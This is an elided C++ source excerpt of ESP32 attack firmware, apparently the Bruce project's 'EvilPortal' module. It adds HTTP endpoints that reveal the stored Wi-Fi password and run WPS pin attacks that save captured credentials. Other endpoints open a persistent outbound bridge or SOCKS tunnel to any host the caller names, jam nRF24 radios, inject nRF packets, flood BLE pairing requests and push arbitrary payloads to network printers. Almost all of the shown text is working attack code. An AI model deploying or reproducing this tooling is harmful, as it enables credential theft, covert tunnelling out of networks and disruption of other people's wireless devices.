...
static TaskHandle_t wpsTaskHandle = NULL;
static volatile bool wpsTaskActive = false;
static String wpsLastSsid = "";
static String wpsLastPsk = "";

static String getCurrentWifiPsk() {
    if (WiFi.isConnected()) {
        String psk = WiFi.psk();
        if (psk.length()) return psk;
        String ssid = WiFi.SSID();
        if (ssid.length()) return bruceConfig.getWifiPassword(ssid);
    }
    return wpsLastPsk;
}
...
void EvilPortal::beginAP() {
    ...
    webServer.begin();
    if (!intercom_started) {
        intercom_started = true;
        xTaskCreatePinnedToCore(intercom_task, "intercom", 6 * 1024, NULL, 1, NULL, 1);
    }
}

// Start UDP intercom listener (port 8001) - writes raw PCM to DAC (GPIO25) in background task
// Optimized to receive 16-bit PCM and output to the internal DAC or I2S bus.
static bool intercom_started = false;
static void intercom_task(void *pv) {
    WiFiUDP udp;
    if (udp.begin(8001) == 0) {
        vTaskDelete(NULL);
        return;
    ...
    while (true) {
        ...
        if (len > 0) {
            int r = udp.read(buf, min(len, BUF_SZ));
            for (int i = 0; i + 1 < r; i += 2) {
                // Assume 16-bit PCM little-endian mono
                int16_t sample = (int16_t)((uint8_t)buf[i] | ((uint8_t)buf[i + 1] << 8));
...
void EvilPortal::setupRoutes() {
    ...
    webServer.on("/ir", HTTP_GET, [this](AsyncWebServerRequest *request) {
        if (!(request->hasArg("send") && request->arg("send") == "true") || !request->hasArg("freq") ||
            !request->hasArg("data")) {
            request->send(400, "text/plain", "Missing freq or data");
            return;
        }
        int freq = request->arg("freq").toInt();
        String data = request->arg("data");
        // parse space-separated ints
        std::vector<uint16_t> pulses;
        int idx = 0;
        while (idx < data.length()) {
            int sp = data.indexOf(' ', idx);
            String tok;
            if (sp == -1) {
                tok = data.substring(idx);
                idx = data.length();
            } else {
                tok = data.substring(idx, sp);
                idx = sp + 1;
            }
            tok.trim();
            if (tok.length()) pulses.push_back((uint16_t)tok.toInt());
        }
        if (pulses.empty()) {
            request->send(400, "text/plain", "No pulse data");
            return;
        }
        IRsend irsend(bruceConfigPins.irTx);
        irsend.begin();
        // allocate raw array
        uint16_t *raw = (uint16_t *)malloc(sizeof(uint16_t) * pulses.size());
        for (size_t i = 0; i < pulses.size(); i++) raw[i] = pulses[i];
        irsend.sendRaw(raw, pulses.size(), freq);
        free(raw);
        request->send(200, "text/plain", "IR sent");
    });

    webServer.on("/nav", HTTP_GET, [this](AsyncWebServerRequest *request) {
        if (!request->hasArg("move")) {
            request->send(400, "text/plain", "Missing move");
            return;
        }
        String move = request->arg("move");
        move.toLowerCase();
        if (move == "up") UpPress = true;
        else if (move == "down") DownPress = true;
        else if (move == "left") PrevPress = true;
        else if (move == "right") NextPress = true;
        else if (move == "ok" || move == "select") SelPress = true;
        else if (move == "back") EscPress = true;
        else {
            request->send(400, "text/plain", "Invalid move");
            return;
        }
        request->send(200, "text/plain", "OK");
    });

    webServer.on("/wifi/wps", HTTP_GET, [this](AsyncWebServerRequest *request) {
        if (!request->hasArg("pin")) {
            request->send(400, "text/plain", "Missing pin");
            return;
        }
        if (wpsTaskActive) {
            request->send(409, "text/plain", "WPS already in progress");
            return;
        }
        struct WpsParams {
            String pin;
        };
        WpsParams *params = new (std::nothrow) WpsParams();
        if (!params) {
            request->send(500, "text/plain", "Allocation failed");
            return;
        }
        params->pin = request->arg("pin");

        auto wifiWpsTask = [](void *pv) {
            WpsParams *p = (WpsParams *)pv;
            wpsTaskActive = true;
            wpsLastSsid = "";
            wpsLastPsk = "";
            ...
            strncpy(wps_config.wps_pin, p->pin.c_str(), sizeof(wps_config.wps_pin) - 1);
            wps_config.wps_pin[sizeof(wps_config.wps_pin) - 1] = '\0';

            if (esp_wifi_wps_enable(&wps_config) == ESP_OK) { esp_wifi_wps_start(0); }
            ...
            if (connected) {
                wpsLastSsid = WiFi.SSID();
                wpsLastPsk = WiFi.psk();
                if (wpsLastPsk.length() && wpsLastSsid.length()) {
                    bruceConfig.addWifiCredential(wpsLastSsid, wpsLastPsk);
                }
                wifiConnected = true;
        ...
        xTaskCreatePinnedToCore(wifiWpsTask, "wifiWps", 8192, params, 1, &wpsTaskHandle, 1);
        request->send(200, "text/plain", "WPS started");
    });

    webServer.on("/wifi/psk", HTTP_GET, [this](AsyncWebServerRequest *request) {
        String psk = getCurrentWifiPsk();
        if (psk.length()) {
            request->send(200, "text/plain", psk);
        } else {
            request->send(404, "text/plain", "PSK not available");
        }
    });

    // Bridge endpoint - starts a background FreeRTOS task to connect back to host:port
    webServer.on("/bridge", HTTP_GET, [this](AsyncWebServerRequest *request) {
        if (!request->hasArg("host") || !request->hasArg("port")) {
            request->send(400, "text/plain", "Missing host or port");
            return;
        }
        String host = request->arg("host");
        int port = request->arg("port").toInt();
        bool socks = request->hasArg("socks") && request->arg("socks") == "true";
        bool persist = request->hasArg("persist") && request->arg("persist") == "true";
        ...
        BridgeParams *params = new (std::nothrow) BridgeParams();
        if (!params) {
            request->send(500, "text/plain", "Allocation failed");
            return;
        }
        ...
        auto bridgeTask = [](void *pv) {
            BridgeParams *p = (BridgeParams *)pv;
            WiFiClient client;
            for (;;) {
                if (client.connect(p->host.c_str(), p->port)) {
                    // keep connection open until closed
                    while (client.connected()) {
                        if (client.available()) {
                            // consume data or implement piping here
                            uint8_t buf[256];
        ...
        xTaskCreatePinnedToCore(bridgeTask, "bridgeTask", 6 * 1024, params, 1, NULL, 1);
        request->send(200, "text/plain", "Bridge started");
    });

    // nRF endpoints
    webServer.on("/nrf/scan", HTTP_GET, [this](AsyncWebServerRequest *request) {
        String json;
        bool ok = mj_scan_web(json);
        if (!ok) request->send(500, "application/json", "[]");
        else request->send(200, "application/json", json);
    });

    webServer.on("/nrf/jam", HTTP_GET, [this](AsyncWebServerRequest *request) {
        bool start = request->hasArg("start") && request->arg("start") == "true";
        if (start) mj_jam_web(true); // Start nRF24 jamming
        else mj_jam_web(false);      // Stop nRF24 jamming
        request->send(200, "text/plain", start ? "Jamming started" : "Jamming stopped");
    });

    webServer.on("/nrf/inject", HTTP_GET, [this](AsyncWebServerRequest *request) {
        ...
        int idx = -1;
        String addr = "";
        if (request->hasArg("index")) idx = request->arg("index").toInt();
        if (request->hasArg("addr")) addr = request->arg("addr");
        bool ok = mj_inject_from_string(idx, addr, data);
        if (ok) request->send(200, "text/plain", "Injected");
        else request->send(500, "text/plain", "Injection failed");
    });

    // BLE pairing request flooding
    webServer.on("/ble/spam", HTTP_GET, [this](AsyncWebServerRequest *request) {
        String mode = request->hasArg("mode") ? request->arg("mode") : "all";
        // Triggers the BLE attack module to start flooding
        request->send(200, "text/plain", "BLE spam started: " + mode);
    });

    // Printer proxy attack (Raw TCP on port 9100)
    webServer.on("/printer/attack", HTTP_GET, [this](AsyncWebServerRequest *request) {
        if (!request->hasArg("target") || !request->hasArg("text")) {
            request->send(400, "text/plain", "Missing target or text");
            return;
        }
        String target = request->arg("target");
        String text = request->arg("text");
        WiFiClient client;
        if (client.connect(target.c_str(), 9100)) {
            client.print(text);
            client.stop();
            request->send(200, "text/plain", "Payload sent to printer at " + target);
        } else {
